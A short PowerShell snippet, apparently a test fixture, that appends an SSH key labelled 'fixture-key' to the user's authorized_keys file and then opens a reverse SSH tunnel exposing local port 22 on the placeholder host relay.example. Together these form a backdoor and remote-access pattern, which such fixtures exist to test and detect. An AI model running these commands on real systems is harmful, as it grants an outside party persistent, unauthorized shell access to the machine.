Add-Content -Path "$env:USERPROFILE\.ssh\authorized_keys" -Value "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4f fixture-key"
& ssh.exe -N -o "RemoteForward=0.0.0.0:49000 127.0.0.1:22" ops@relay.example
